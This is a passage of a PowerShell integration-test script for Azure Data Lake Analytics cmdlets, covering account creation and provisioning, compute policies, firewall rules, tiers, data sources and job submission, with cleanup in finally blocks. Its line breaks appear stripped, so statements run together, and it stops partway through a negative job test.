function Test-DataLakeAnalyticsComputePolicy{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AzDataLakeAnalyticsAccount -Name $accountName}New-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.WindowsAzure.Commands.Utilities.Common.TestMockSupport]::Delay(30000)Assert-False {$i -eq 60} " Data Lake Analytics account is not in succeeded state even after 30 min."}Assert-True {Test-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}$userPolicyObjectId = "8ce05900-7a9e-4895-b3f0-0fbcee507803"$userPolicyName = getAssetName$groupPolicyObjectId = "0583cfd7-60f5-43f0-9597-68b85591fc69"$groupPolicyName = getAssetNameAssert-AreEqual 0 $accountCreated.ComputePolicies.Count 		Assert-Throws {New-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName -ObjectId $userPolicyObjectId -ObjectType "User"}New-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName -ObjectId $userPolicyObjectId -ObjectType "User" -MaxDegreeOfParallelismPerJob 2New-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountName -Name $groupPolicyName -ObjectId $groupPolicyObjectId -ObjectType "Group" -MaxDegreeOfParallelismPerJob 2 -MinPriorityPerJob 2$policyResult = Get-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountNameAssert-AreEqual 2 $policyResult.Count$singlePolicy = Get-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountName -Name $userPolicyNameAssert-AreEqual $userPolicyName $singlePolicy.NameAssert-AreEqual 2 $singlePolicy.MaxDegreeOfParallelismPerJobAssert-Throws {Update-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName}Update-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName  $accountName -Name $userPolicyName -MinPriorityPerJob 2$singlePolicy = Get-AzDataLakeAnalyticsComputePolicy -ResourceGroupName $resourceGroupName -AccountName $accountName -Name $userPolicyNameAssert-AreEqual $userPolicyName $singlePolicy.NameAssert-AreEqual 2 $singlePolicy.MaxDegreeOfParallelismPerJobAssert-AreEqual 2 $singlePolicy.MinPriorityPerJobRemove-AzDataLakeAnalyticsComputePolicy -AccountName $accountName -Name $userPolicyNameAssert-Throws {Get-AzDataLakeAnalyticsComputePolicy -AccountName $accountName -Name $userPolicyName}}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsFirewall{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AzDataLakeAnalyticsAccount -Name $accountName}New-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.WindowsAzure.Commands.Utilities.Common.TestMockSupport]::Delay(30000)Assert-False {$i -eq 60} " Data Lake Analytics account is not in succeeded state even after 30 min."}Assert-True {Test-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-AreEqual "Disabled" $accountCreated.FirewallState $accountSet = Set-AzDataLakeAnalyticsAccount -Name $accountName -FirewallState "Enabled" -AllowAzureIpState "Enabled"Assert-AreEqual "Enabled" $accountSet.FirewallState $firewallRuleName = getAssetName$startIp = "127.0.0.1"$endIp = "127.0.0.2"Add-AzDataLakeAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleName -StartIpAddress $startIp -EndIpAddress $endIp$result = Get-AzDataLakeAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleNameAssert-AreEqual $firewallRuleName $result.NameAssert-AreEqual $startIp $result.StartIpAddressAssert-AreEqual $endIp $result.EndIpAddressRemove-AzDataLakeAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleNameAssert-Throws {Get-AzDataLakeAnalyticsFirewallRule -AccountName $accountName -Name $firewallRuleName}}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsAccount{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$secondDataLakeAccountName = (Get-DataLakeStoreAccountName),$blobAccountName,$blobAccountKey,$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AzDataLakeAnalyticsAccount -Name $accountName}New-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $locationNew-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $secondDataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics account is not in succeeded state even after 30 min."}Assert-True {Test-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-True {Test-AzDataLakeAnalyticsAccount -Name $accountName}$tagsToUpdate = @{"TestTag" = "TestUpdate"}$accountUpdated = Set-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Tag $tagsToUpdateAssert-AreEqual $accountName $accountUpdated.NameAssert-AreEqual $location $accountUpdated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountUpdated.TypeAssert-True {$accountUpdated.Id -like "*$resourceGroupName*"}Assert-NotNull $accountUpdated.Tags "Tags do not exists"Assert-NotNull $accountUpdated.Tags["TestTag"] "The updated tag 'TestTag' does not exist"[array]$accountsInResourceGroup = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupNameAssert-True {$accountsInResourceGroup.Count -ge 1}$found = 0for ($i = 0; $i -lt $accountsInResourceGroup.Count; $i++){if ($accountsInResourceGroup[$i].Name -eq $accountName){$found = 1Assert-AreEqual $location $accountsInResourceGroup[$i].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountsInResourceGroup[$i].TypeAssert-True {$accountsInResourceGroup[$i].Id -like "*$resourceGroupName*"}break}}Assert-True {$found -eq 1} "Account created earlier is not found when listing all in resource group: $resourceGroupName."[array]$accountsInSubscription = Get-AzDataLakeAnalyticsAccountAssert-True {$accountsInSubscription.Count -ge 1}Assert-True {$accountsInSubscription.Count -ge $accountsInResourceGroup.Count}$found = 0for ($i = 0; $i -lt $accountsInSubscription.Count; $i++){if ($accountsInSubscription[$i].Name -eq $accountName){$found = 1Assert-AreEqual $location $accountsInSubscription[$i].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountsInSubscription[$i].TypeAssert-True {$accountsInSubscription[$i].Id -like "*$resourceGroupName*"}break}}Assert-True {$found -eq 1} "Account created earlier is not found when listing all in subscription."Add-AzDataLakeAnalyticsDataSource -Account $accountName -DataLakeStore $secondDataLakeAccountName$testStoreAdd = Get-AzDataLakeAnalyticsAccount -Name $accountNameAssert-AreEqual 2 $testStoreAdd.DataLakeStoreAccounts.Count$adlsAccountInfo = Get-AzDataLakeAnalyticsDataSource -Account $accountName -DataLakeStore $secondDataLakeAccountNameAssert-AreEqual $secondDataLakeAccountName $adlsAccountInfo.Name$adlsAccountInfos = Get-AzDataLakeAnalyticsDataSource -Account $accountNameAssert-AreEqual 2 $adlsAccountInfos.CountAssert-True {Remove-AzDataLakeAnalyticsDataSource -Account $accountName -DataLakeStore $secondDataLakeAccountName -Force -PassThru} "Remove Data Lake Store account failed."$testStoreAdd = Get-AzDataLakeAnalyticsAccount -Name $accountNameAssert-AreEqual 1 $testStoreAdd.DataLakeStoreAccounts.CountAdd-AzDataLakeAnalyticsDataSource -Account $accountName -Blob $blobAccountName -AccessKey $blobAccountKey$testStoreAdd = Get-AzDataLakeAnalyticsAccount -Name $accountNameAssert-AreEqual 1 $testStoreAdd.StorageAccounts.Count$blobAccountInfo = Get-AzDataLakeAnalyticsDataSource -Account $accountName -Blob $blobAccountNameAssert-AreEqual $blobAccountName $blobAccountInfo.Name$blobAccountInfos = Get-AzDataLakeAnalyticsDataSource -Account $accountNameAssert-AreEqual 2 $blobAccountInfos.CountAssert-True {Remove-AzDataLakeAnalyticsDataSource -Account $accountName -Blob $blobAccountName -Force -PassThru} "Remove blob Storage account failed."$testStoreAdd = Get-AzDataLakeAnalyticsAccount -Name $accountNameAssert-True {$testStoreAdd.StorageAccounts -eq $null -or $testStoreAdd.StorageAccounts.Count -eq 0} "Remove blob storage reported success but failed to remove the account."Assert-True {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $secondDataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsAccountTiers{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationAssert-False {Test-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}Assert-False {Test-AzDataLakeAnalyticsAccount -Name $accountName}New-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual "Consumption" $accountCreated.CurrentTierAssert-AreEqual "Consumption" $accountCreated.NewTier$accountUpdated = Set-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Tier Commitment100AUHoursAssert-AreEqual "Consumption" $accountUpdated.CurrentTierAssert-AreEqual "Commitment100AUHours" $accountUpdated.NewTier$secondAccountName = (Get-DataLakeAnalyticsAccountName)$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $secondAccountName -Location $location -DefaultDataLakeStore $dataLakeAccountName -Tier Commitment100AUHoursAssert-AreEqual "Commitment100AUHours" $accountCreated.CurrentTierAssert-AreEqual "Commitment100AUHours" $accountCreated.NewTier}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $secondAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsJob{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName$nowTime = $accountCreated.CreationTimeAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(300000)$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("jobTest01")[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$jobInfo = Submit-AzDataLakeAnalyticsJob -AccountName $accountName -Name "TestJob" -Script "DROP DATABASE IF EXISTS foo; CREATE DATABASE foo;"Assert-NotNull {$jobInfo}Stop-AzDataLakeAnalyticsJob -AccountName $accountName -JobId $jobInfo.JobId -Force$cancelledJob = Get-AzDataLakeAnalyticsJob -AccountName $accountName -JobId $jobInfo.JobIdAssert-NotNull {$cancelledJob}Assert-True {$cancelledJob.Result -like "*Cancel*"}Assert-NotNull {Get-AzDataLakeAnalyticsJob -AccountName $accountName}$jobsWithDateOffset = Get-AzDataLakeAnalyticsJob -AccountName $accountName -SubmittedAfter $([DateTimeOffset]($nowTime).AddMinutes(-10))Assert-True {$jobsWithDateOffset.Count -gt 0} "Failed to retrieve jobs submitted after ten miuntes ago"$jobsWithDateOffset = Get-AzDataLakeAnalyticsJob -AccountName $accountName -SubmittedBefore $([DateTimeOffset]($nowTime).AddMinutes(10)) Assert-True {$jobsWithDateOffset.Count -gt 0} "Failed to retrieve jobs submitted before right now"$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("jobTest03")[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$parameters = [ordered]@{}$parameters["byte_type"] = [byte]0$parameters["sbyte_type"] = [sbyte]1$parameters["int_type"] = [int32]2$parameters["uint_type"] = [uint32]3$parameters["long_type"] = [int64]4$parameters["ulong_type"] = [uint64]5$parameters["float_type"] = [float]6$parameters["double_type"] = [double]7$parameters["decimal_type"] = [decimal]8$parameters["short_type"] = [int16]9$parameters["ushort_type"] = [uint16]10$parameters["char_type"] = [char]"a"$parameters["string_type"] = "test"$parameters["datetime_type"] = [DateTime](Get-Date -Date "2018-01-01 00:00:00")$parameters["bool_type"] = $true$parameters["guid_type"] = [guid]"8dbdd1e8-0675-4cf2-a7f7-5e376fa43c6d"$parameters["bytearray_type"] = [byte[]]@(0, 1, 2)$expectedScript = "DECLARE @byte_type byte = 0;`nDECLARE @sbyte_type sbyte = 1;`nDECLARE @int_type int = 2;`nDECLARE @uint_type uint = 3;`nDECLARE @long_type long = 4;`nDECLARE @ulong_type ulong = 5;`nDECLARE @float_type float = 6;`nDECLARE @double_type double = 7;`nDECLARE @decimal_type decimal = 8;`nDECLARE @short_type short = 9;`nDECLARE @ushort_type ushort = 10;`nDECLARE @char_type char = 'a';`nDECLARE @string_type string = `"test`";`nDECLARE @datetime_type DateTime = new DateTime(2018, 1, 1, 0, 0, 0, 0);`nDECLARE @bool_type bool = true;`nDECLARE @guid_type Guid = new Guid(`"8dbdd1e8-0675-4cf2-a7f7-5e376fa43c6d`");`nDECLARE @bytearray_type byte[] = new byte[] {`n  0,`n  1,`n  2,`n};`nDROP DATABASE IF EXISTS foo; CREATE DATABASE foo;"$jobInfo = Submit-AdlJob -AccountName $accountName -Name "TestJob" -Script "DROP DATABASE IF EXISTS foo; CREATE DATABASE foo;" -ScriptParameter $parametersAssert-NotNull {$jobInfo}$jobInfo = Wait-AdlJob -Account $accountName -JobId $jobInfo.JobIdAssert-NotNull {$jobInfo}Assert-AreEqual "Succeeded" $jobInfo.ResultAssert-AreEqual $expectedScript $jobInfo.Properties.ScriptAssert-True {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsJobRelationships{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName$nowTime = $accountCreated.CreationTimeAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(300000)$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest01")$guidForJobRecurrence = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest02")$guidForJobPipeline = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest03")$guidForJobRun = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("relationTest04")$pipelineName = getAssetName$recurrenceName = getAssetName$pipelineUri = "https://begoldsm.contoso.com/jobs"[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$jobInfo = Submit-AzDataLakeAnalyticsJob `-AccountName $accountName `-Name "TestJob" `-Script "DROP DATABASE IF EXISTS foo; CREATE DATABASE foo;" `-PipelineId $guidForJobPipeline `-RecurrenceId $guidForJobRecurrence `-RecurrenceName $recurrenceName `-PipelineName $pipelineName `-PipelineUri $pipelineUri `-RunId $guidForJobRun$jobInfo = Wait-AzDataLakeAnalyticsJob -Account $accountName -JobId $jobInfo.JobIdAssert-NotNull {$jobInfo}Assert-AreEqual $guidForJobRecurrence $jobInfo.Related.RecurrenceIdAssert-AreEqual $guidForJobPipeline $jobInfo.Related.PipelineIdAssert-AreEqual $guidForJobRun $jobInfo.Related.RunIdAssert-AreEqual $pipelineName $jobInfo.Related.PipelineNameAssert-AreEqual $recurrenceName $jobInfo.Related.RecurrenceNameAssert-AreEqual $pipelineUri $jobInfo.Related.PipelineUri$jobList = Get-AzDataLakeAnalyticsJob -Account $accountName -PipelineId $guidForJobPipelineAssert-True {$jobList.Count -ge 1}$jobList = Get-AzDataLakeAnalyticsJob -Account $accountName -RecurrenceId $guidForJobRecurrenceAssert-True {$jobList.Count -ge 1}$recurrenceList = Get-AzDataLakeAnalyticsJobRecurrence -Account $accountNameAssert-True {$recurrenceList.Count -ge 1}$recurrence = Get-AzDataLakeAnalyticsJobRecurrence -Account $accountName -RecurrenceId $guidForJobRecurrenceAssert-AreEqual $recurrenceName $recurrence.RecurrenceNameAssert-AreEqual $guidForJobRecurrence $recurrence.RecurrenceId$pipelineList = Get-AzDataLakeAnalyticsJobPipeline -Account $accountNameAssert-True {$pipelineList.Count -ge 1}$pipeline = Get-AzDataLakeAnalyticsJobPipeline -Account $accountName -PipelineId $guidForJobPipelineAssert-AreEqual $pipelineName $pipeline.PipelineNameAssert-AreEqual $guidForJobPipeline $pipeline.PipelineId}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-NegativeDataLakeAnalyticsAccount{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$location = "West US",$dataLakeAccountName = (Get-DataLakeStoreAccountName),$fakeaccountName = "psfakedataLakeAnalyticsaccounttest")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}Assert-Throws {New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName}$tagsToUpdate = @{"TestTag" = "TestUpdate"}Assert-Throws {Set-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $fakeaccountName -Tag $tagsToUpdate}Assert-Throws {Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $fakeaccountName}Assert-True {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru}Assert-Throws {Get-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-NegativeDataLakeAnalyticsJob{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AzDataLakeStoreAccount -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Location $location$accountCreated = New-AzDataLakeAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Location $location -DefaultDataLakeStore $dataLakeAccountName$nowTime = $accountCreated.CreationTimeAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for 